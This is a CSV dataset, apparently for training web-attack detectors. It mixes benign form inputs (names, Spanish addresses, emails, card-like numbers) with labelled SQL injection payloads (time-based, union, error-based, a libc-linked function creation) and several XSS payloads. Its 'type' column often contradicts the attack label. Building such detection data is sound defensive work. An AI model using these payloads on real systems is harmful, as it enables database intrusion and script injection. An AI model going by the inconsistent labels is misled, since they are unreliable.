Text,attack_type,Label,type
"1%')) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
9366583302251207,norm,0,normal
"diaz camacho 107, 2-a",norm,0,normal
zylstra,norm,0,normal
41992996x,norm,0,normal
parke antonio trueba 175,norm,0,normal
c/ alcalde gabriel mejias pombo 121 6-f,norm,0,normal
"-4546') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
"1"" where 1920=1920 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"-3498"")) as xbvb where 2056=2056 union all select 2056,2056,2056,2056,2056,2056,2056--",sqli,1,sql
"geturl(""javascript:alert('xss')"")",xss,2,xss
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""hsaw""=""hsaw",sqli,1,normal
"1"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1"") waitfor delay '0:0:5' and (""vjpg""=""vjpg",sqli,1,normal
chihung,norm,0,normal
"1%"" rlike sleep(5) and ""%""=""",sqli,1,normal
koline.mathieson@viavilano.lv,norm,0,normal
"1')) as yyja where 4321=4321 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
mehboob,norm,0,normal
1))) or 6793=(select 6793 from pg_sleep(5)) and (((3919=3919,sqli,1,sql
escon*der,norm,0,normal
09069193v,norm,0,normal
10ucare51,norm,0,normal
"1'+(select 'stdl' where 4581=4581;iif(7953=3021,1,1/0)",sqli,1,sql
1);waitfor delay '0:0:5'--,sqli,1,sql
1523492896649032,norm,0,normal
pico.malm@4horas.sm,norm,0,normal
1;select sleep(5),sqli,1,sql
sant jaume de frontany,norm,0,normal
ruhl.friedkin@opel-e-flex.in,norm,0,normal
"1"") or sleep(5)#",sqli,1,normal
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",sqli,1,sql
2112145252606070,norm,0,normal
29450,norm,0,normal
ohenry.ridofi2@e-b-s.gr,norm,0,normal
"-5225')) as zats where 5629=5629 union all select 5629,5629,5629,5629,5629--",sqli,1,sql
73732702s,norm,0,normal
"1"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""tfso""=""tfso",sqli,1,sql
salv sagra,norm,0,normal
madrigal puigb,norm,0,normal
8320964749931174,norm,0,normal
"-6772"")) or 9323=9323#",sqli,1,normal
8695,norm,0,normal
charissa,norm,0,normal
"burgos, 40, 7?a",norm,0,normal
"1""));select case when 1802=7063 then 1 else null end--",sqli,1,sql
"c/ magallanes, 42,",norm,0,normal
metrorragia,norm,0,normal
03518,norm,0,normal
8545414312654589,norm,0,normal
"calle robert gerhard, s/n 6c",norm,0,normal
"1 where 7906=7906 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
30591115b,norm,0,normal
rosadelima,norm,0,normal
corota,norm,0,normal
37618946p,norm,0,normal
greenhalgh@cafedeteatro.np,norm,0,normal
"1 where 3902=3902 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1"")) and (select * from (select(sleep(5)))fzno) and ((""dyoe""=""dyoe",sqli,1,sql
raixa s/n,norm,0,normal
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('ylql' like 'ylql",sqli,1,normal
"1' in boolean mode);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",sqli,1,sql
seddon@7peines.es,norm,0,normal
"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",sqli,1,sql
nahuel,norm,0,normal
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('obeh'='obeh",sqli,1,normal
"1"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""kldp"" like ""kldp",sqli,1,sql
"1"" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""ouix""=""ouix",sqli,1,sql
"1%"")) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
chmara@novolardiseno.ky,norm,0,normal
dirck,norm,0,normal
"calle duran 84,",norm,0,normal
05200,norm,0,normal
"-2979')) as klou where 7092=7092 union all select 7092,7092--",sqli,1,sql
vasil9,norm,0,normal
"-8686"" where 4532=4532 or elt(3301=9065,9065)--",sqli,1,sql
koczian@decoaching.is,norm,0,normal
1%' or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
tauber5@lamolahotel.bb,norm,0,normal
"1""))) and 7135=8805#",sqli,1,normal
calle rosa de los vientos 166 9?a,norm,0,normal
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('bhlx' like 'bhlx",sqli,1,sql
bayly,norm,0,normal
amidou@suncorp.gob,norm,0,normal
pradeep,norm,0,normal
4res-cr7pc4n,norm,0,normal
1))) or sleep(5) and (((2209=2209,sqli,1,normal
1) as sglv where 7676=7676;begin dbms_lock.sleep(5); end--,sqli,1,sql
"1) as ktfu where 2637=2637;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
holgachona,norm,0,normal
"1') where 1470=1470 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
encalador,norm,0,normal
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'rhzy'='rhzy",sqli,1,sql
-7231)) union all select 7639#,sqli,1,sql
"1'||(select 'fjlg' from dual where 9517=9517;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
fram,norm,0,normal
2523504851273429,norm,0,normal
thate@didacramirez.eu,norm,0,normal
03520,norm,0,normal
ineluctable,norm,0,normal
1'+(select 'mzee' where 5984=5984;(select * from (select(sleep(5)))acdk)#,sqli,1,sql
peafiel,norm,0,normal
ervin,norm,0,normal
"1%""));select (case when (9931=3424) then 1 else 9931*(select 9931 from master..sysdatabases) end)--",sqli,1,sql
08880,norm,0,normal
barber,norm,0,normal
1%'))) or 6793=(select 6793 from pg_sleep(5)) and ((('%'=',sqli,1,sql
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# zcyc",sqli,1,sql
1))) and (3020=3020)*6703 and (((1233=1233,sqli,1,normal
brittni,norm,0,normal
"angel custodio 44, 12-c",norm,0,normal
poyales del hoyo,norm,0,normal
puigpunyent,norm,0,normal
"1)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (5099=5099",sqli,1,sql
"1"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",sqli,1,normal
"1""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
1'+(select 'qxmo' where 9511=9511 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
"1"" and sleep(5)",sqli,1,normal
100,norm,0,normal
"1)) as gygm where 4024=4024;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
pockett_miguelin@noviasteresapalacios.aw,norm,0,normal
0650065659557709,norm,0,normal
"1"");select sleep(5)#",sqli,1,sql
poli8l2a,norm,0,normal
"1%""))) and 6969=(select 6969 from pg_sleep(5)) and (((""%""=""",sqli,1,sql
12182,norm,0,normal
"1"" and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"carril lloret, 52",norm,0,normal
5968547562728499,norm,0,normal
1) and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
lazure,norm,0,normal
1'));select (case when (8601=1220) then 8601 else 8601*(select 8601 from mysql.db) end)#,sqli,1,sql
saint-simon-vondis@paremoselalzheimer.dj,norm,0,normal
"1"") where 4822=4822 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
underwoo,norm,0,normal
argimn,norm,0,normal
"1"")) as osuh where 8809=8809;select (case when (9388=4322) then 1 else 9388*(select 9388 from master..sysdatabases) end)--",sqli,1,sql
jar49era,norm,0,normal
49622,norm,0,normal
6256619473933426,norm,0,normal
"1%""))) and sleep(5) and (((""%""=""",sqli,1,normal
vikram,norm,0,normal
"-9904"")) union all select 9080,9080,9080,9080,9080--",sqli,1,sql
camp fein,norm,0,normal
5277423827718841,norm,0,normal
valdenebro,norm,0,normal
1' in boolean mode);(select * from (select(sleep(5)))acdk)#,sqli,1,sql
"1""))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
89372245h,norm,0,normal
barbalos,norm,0,normal
1) as xtgr where 1545=1545;select pg_sleep(5)--,sqli,1,sql
-hatajador,norm,0,normal
"1)) as amyr where 7875=7875 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"1') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ('ydxb'='ydxb",sqli,1,normal
"-4236) union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",sqli,1,sql
-5062) where 7457=7457 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
mat farriols,norm,0,normal
newtell@theroxyblue.ir,norm,0,normal
pozzetto@miplat.am,norm,0,normal
91,norm,0,normal
vitriago iribe,norm,0,normal
wolbert.navin@cirugiaalbeiteria.nu,norm,0,normal
82063475g,norm,0,normal
1')));(select * from (select(sleep(5)))srmq) and ((('ksoc'='ksoc,sqli,1,sql
22400,norm,0,normal
"1"" or 6793=(select 6793 from pg_sleep(5))",sqli,1,sql
plaza asociacion de la prensa 107,norm,0,normal
ramaprak,norm,0,normal
50344,norm,0,normal
"1%')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('%'='",sqli,1,sql
"calle fermin caballero, 103, 10h",norm,0,normal
-4562') or 3038=3038,sqli,1,normal
reconfortante,norm,0,normal
48394,norm,0,normal
45054784s,norm,0,normal
"1'+(select 'midn' where 2819=2819 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",sqli,1,sql
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)-- hlgt",sqli,1,sql
"1%' and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
8151,norm,0,normal
1 where 8966=8966;if(1087=5839) select 1087 else drop function zzeh--,sqli,1,sql
"-7996"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""iuzv"" like ""iuzv",sqli,1,sql
valimir,norm,0,normal
5756,norm,0,normal
hymen_israeli@aulahost.vc,norm,0,normal
houde,norm,0,normal
"-7126')) as fzpp where 8078=8078 union all select 8078,8078,8078,8078,8078,8078,8078#",sqli,1,sql
"1%"" or sleep(5) and ""%""=""",sqli,1,normal
1' and 2316=7236,sqli,1,normal
kristina,norm,0,normal
3613851570942455,norm,0,normal
stanleig,norm,0,normal
17751,norm,0,normal
lovejoy,norm,0,normal
-7453'))) or 8571=8571--,sqli,1,sql
a297ril83,norm,0,normal
salicilato,norm,0,normal
44338,norm,0,normal
"andia, 113 11g",norm,0,normal
gusta mont,norm,0,normal
28670,norm,0,normal
47,norm,0,normal
trejan@carloshoya.mo,norm,0,normal
z218z11ri451,norm,0,normal
"1)) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"""--><img src=x onerror=alert(1)//"">",xss,2,xss
96761343k,norm,0,normal
25597,norm,0,normal
kimberle,norm,0,normal
1%' or sleep(5) and '%'=',sqli,1,normal
salinas de oro,norm,0,normal
i-ching,norm,0,normal
grace,norm,0,normal
"plza. fuentes claras, 74",norm,0,normal
c/ pirucha s/n 4-e,norm,0,normal
cedo rosa's,norm,0,normal
6086364354630627,norm,0,normal
1) where 9649=9649 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
lavat@ajuntamentbarcelona20.gy,norm,0,normal
somnfero,norm,0,normal
48171319g,norm,0,normal
crip3gama,norm,0,normal
-2223')) as mjwp where 8650=8650 or 7900=5838,sqli,1,normal
"1) as vqbf where 4020=4020;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
0i26or7os9,norm,0,normal
estof6d94a,norm,0,normal
delpy_wrixon@tecnoindomo.gs,norm,0,normal
baix pallars,norm,0,normal
"1%"");waitfor delay '0:0:5'--",sqli,1,sql
"granados 151,",norm,0,normal
adjurable,norm,0,normal
22200,norm,0,normal
04100,norm,0,normal
domine,norm,0,normal
56443206x,norm,0,normal
4811965033503576,norm,0,normal
karolefs,norm,0,normal
"1' in boolean mode);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""ampn"" like ""ampn",sqli,1,sql
baston_lory@provider.com.mk,norm,0,normal
"-2725"" union all select 3671,3671,3671,3671,3671#",sqli,1,sql
d_eslechar,norm,0,normal
"1 where 6518=6518;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
1') and (7603=3634)*3634,sqli,1,normal
1 where 3354=3354;begin user_lock.sleep(5); end--,sqli,1,sql
escrutador,norm,0,normal
poseidon6,norm,0,normal
1') as inid where 7812=7812 or 6793=(select 6793 from pg_sleep(5))--,sqli,1,sql
dreyfuss6,norm,0,normal
3527135091788318,norm,0,normal
"1')) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
josef,norm,0,normal
luna,norm,0,normal
pech+e,norm,0,normal
5rt(0);'>rhainfosec,xss,2,sql
"1' where 4185=4185 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1,sql
22416,norm,0,normal
"1))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1'+(select 'pvej' where 4496=4496 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+'",sqli,1,sql
1'+(select 'tbfj' where 4016=4016;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
"1"" where 9521=9521 or (select * from (select(sleep(5)))ydpu)--",sqli,1,sql
6ab48t1r,norm,0,normal
boorse,norm,0,normal
19462,norm,0,normal
"1"")));select (case when (4774=1535) then 4774 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
2503735497393534,norm,0,normal
"1%""))) and sleep(5)#",sqli,1,normal
"-8094) or elt(1032=1032,3623) and (4569=4569",sqli,1,normal
"1) as wype where 6608=6608 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1"" where 9341=9341;select (case when (7645=5921) then 7645 else 7645*(select 7645 from information_schema.character_sets) end)#",sqli,1,sql
1) where 5025=5025;begin user_lock.sleep(5); end--,sqli,1,sql
"fonsagrada, a",norm,0,normal
"1%"")) rlike sleep(5)#",sqli,1,normal
lujn,norm,0,normal
8527,norm,0,normal
-7199' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'qibr'='qibr,sqli,1,sql
"urbanizacion girasoles poblachuela, 155, 11?g",norm,0,normal
"calle licurgo, 39",norm,0,normal
70202479q,norm,0,normal
1647,norm,0,normal
1840,norm,0,normal
sinoyann,norm,0,normal
spruance@maquillajeparalabios.ro,norm,0,normal
"1) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
wiele,norm,0,normal
2996877022240469,norm,0,normal
s3borrea,norm,0,normal
"calle holanda 146,",norm,0,normal
"c/ arbitro eduardo vidal torres, 12, 4c",norm,0,normal
"1')) as owcw where 1107=1107 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1%')) and elt(1210=1210,sleep(5)) and (('%'='",sqli,1,normal
c/ calzada 169,norm,0,normal
01498780p,norm,0,normal
08261,norm,0,normal
virella altimirs,norm,0,normal
b82r8l23o,norm,0,normal
"c/ canigo, 196 8?g",norm,0,normal
josee,norm,0,normal
sask,norm,0,normal
casas de bentez,norm,0,normal
"1') where 1323=1323 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,sql
41457,norm,0,normal
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'ozur'='ozur",sqli,1,normal
calistrato,norm,0,normal
58157080q,norm,0,normal
cabada ferrus,norm,0,normal
-9622'))) order by 1#,sqli,1,normal
ive,norm,0,normal
1) as mtda where 3951=3951;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
brinn,norm,0,normal
"1%"");select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"av. don juan de borbon, s/n",norm,0,normal
tordellego,norm,0,normal
"1""));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
homs amazarray,norm,0,normal
1%'));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
pittman,norm,0,normal
ilia,norm,0,normal
bardischewski9@sexotelefono.rw,norm,0,normal
22521771x,norm,0,normal
43790,norm,0,normal
olaf,norm,0,normal
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,1,sql
"1' or elt(6272=6272,sleep(5)) and 'vrim'='vrim",sqli,1,normal
cobran,norm,0,normal
"pl. lugo 187,",norm,0,normal
porfidio,norm,0,normal
9309,norm,0,normal
9952193601744156,norm,0,normal
izurrieta pomales,norm,0,normal
kinamon,norm,0,normal
1%') waitfor delay '0:0:5'--,sqli,1,sql
rashmi,norm,0,normal
"1') where 6408=6408;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
robertino,norm,0,normal
agn,norm,0,normal
maksimovic@gafasdesol.nom.gl,norm,0,normal
1)) as dgso where 4654=4654 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
cnoves i samals,norm,0,normal
1 where 8532=8532;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
"1%"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""",sqli,1,sql
bettine,norm,0,normal
22100487v,norm,0,normal
5453326584346927,norm,0,normal
1') where 5279=5279 or sleep(5)#,sqli,1,normal
prspera,norm,0,normal
salgado,norm,0,normal
"plaza cinco villas, 103,",norm,0,normal
nelsen,norm,0,normal
1')));select (case when (1227=4014) then 1227 else 1227*(select 1227 from mysql.db) end)#,sqli,1,sql
"-8301') union all select 1806,1806--",sqli,1,sql
-2411 or (8459=8459)*4906# pxwg,sqli,1,normal
cordita,norm,0,normal
ervino,norm,0,normal
o1e6e2d6,norm,0,normal
"1"") as zopq where 2680=2680;select count(*) from generate_series(1,5000000)--",sqli,1,sql
shorwan,norm,0,normal
"1%"")));waitfor delay '0:0:5' and (((""%""=""",sqli,1,sql
mollerus,norm,0,normal
31439,norm,0,normal
1)) and sleep(5) and ((9084=9084,sqli,1,normal
mario,norm,0,normal
galatea,norm,0,normal
"1"") order by 1#",sqli,1,normal
"1%"") union all select null,null#",sqli,1,sql
skaff@hipersevilla.nc,norm,0,normal
1') where 2511=2511 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
"1%"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",sqli,1,sql
"<iframe id=xss ""onload=alert(/xss/)></iframe>",xss,2,xss
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and 'xnap'='xnap,sqli,1,sql
ajuagas,norm,0,normal
46760006v,norm,0,normal
1'+(select 'hjku' where 1954=1954 and (select * from (select(sleep(5)))fzno))+',sqli,1,sql
kava_ivic@comercioenlacalle.info,norm,0,normal
"-1710"")) as cvky where 1858=1858 union all select 1858,1858--",sqli,1,sql
04644,norm,0,normal
hablistn,norm,0,normal
felipa,norm,0,normal
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- zimf",sqli,1,sql
"-1993%"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""%""=""",sqli,1,sql
empuar,norm,0,normal
goth-komarov@frenchpolynesia.com.mg,norm,0,normal
althea4,norm,0,normal
tacoronte,norm,0,normal
sirola@professionalhost.cc,norm,0,normal
cowper@elbauldelosrefranes.pm,norm,0,normal
47606,norm,0,normal
val do dubra,norm,0,normal
"-2230%"" union all select 3303,3303,3303--",sqli,1,sql
"molinos, los",norm,0,normal
50373,norm,0,normal
"-3393"")) union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",sqli,1,sql
94629114f,norm,0,normal
innes,norm,0,normal
"-1763"") or elt(1032=1032,3623) and (""nqvv""=""nqvv",sqli,1,normal
63974696n,norm,0,normal
546,norm,0,normal
30216787p,norm,0,normal
"pl. san marcos, 0, 11f",norm,0,normal
olesen@ballobar.com.mr,norm,0,normal
1%')) and 1651=9324 and (('%'=',sqli,1,normal
mankowsk,norm,0,normal
"carretera cirera 186,",norm,0,normal
1' in boolean mode) rlike (select (case when (7689=7689) then 1 else 0x28 end))#,sqli,1,sql
alexandrova@soybueno.jo,norm,0,normal
"roda de andaluca, la",norm,0,normal
"calle polvorin, 117,",norm,0,normal
"<img src=""mocha:[code]"">",xss,2,normal
"1)) as rcon where 8190=8190 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
1611608298925836,norm,0,normal
"-6279') union all select 3026,3026,3026,3026,3026,3026,3026,3026--",sqli,1,sql
"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",sqli,1,sql
"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",sqli,1,sql
maria-terzon@lingotes.com.org,norm,0,normal
36914497a,norm,0,normal
"(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",sqli,1,sql
"1') as jiic where 6158=6158 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
billotea0,norm,0,normal
1 and (1977=6852)*6852-- clxl,sqli,1,sql
montnchez,norm,0,normal
clee3@ac-activos.sr,norm,0,normal
stapley@cirugiaplasticacordoba.jm,norm,0,normal
revill5,norm,0,normal
22961726k,norm,0,normal
-8410'))) or 8571=8571--,sqli,1,sql
"1)) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((2748=2748",sqli,1,sql
"1"") where 8095=8095 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1,sql
safaa6,norm,0,normal
-8504 where 3086=3086 or 1131=9188#,sqli,1,normal
1'||(select 'gved' from dual where 6965=6965;waitfor delay '0:0:5')||',sqli,1,sql
espinoza blancarte,norm,0,normal
sylvia,norm,0,normal
"-3721') union all select 9050,9050--",sqli,1,sql
5005,norm,0,normal
clemant@engibraltar.com.ae,norm,0,normal
scherzin,norm,0,normal
16813,norm,0,normal
"1"" where 7015=7015;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
seye-brofeldt@naturalagricolacantabria.pn,norm,0,normal
50297,norm,0,normal
"1') and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1') where 6731=6731 or elt(5873=5873,sleep(5))#",sqli,1,normal
"1"" where 9901=9901 and (2455=8499)*8499--",sqli,1,sql
berges@monsur.pt,norm,0,normal
nervino,norm,0,normal
"calle del derecho 17,",norm,0,normal
1) and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
2289,norm,0,normal
pasar por caja,norm,0,normal
7269,norm,0,normal
anaya pez,norm,0,normal
1 where 5080=5080;select (case when (5698=3453) then 5698 else 1/(select 0) end)--,sqli,1,sql
gatliff.charlton@eco-pro.jm,norm,0,normal
1'||(select 'aojt' from dual where 8499=8499;select pg_sleep(5)--,sqli,1,sql
51518357j,norm,0,normal
1'+(select yjyp where 9696=9696;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
.excretoria,norm,0,normal
bullicioso,norm,0,normal
"-1907"")) or 2782=3591",sqli,1,normal
63947168s,norm,0,normal
"1%')) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
adelfa,norm,0,normal
"1"") rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (""kxws"" like ""kxws",sqli,1,sql
"-8703') where 9723=9723 union all select 9723,9723,9723,9723,9723#",sqli,1,sql
"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",sqli,1,sql
azarshah,norm,0,normal
b9s37ac1,norm,0,normal
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""mubt""=""mubt",sqli,1,sql
"-3699%'))) union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#",sqli,1,sql
<body onload=alert('crosssitescripting')>,xss,2,xss
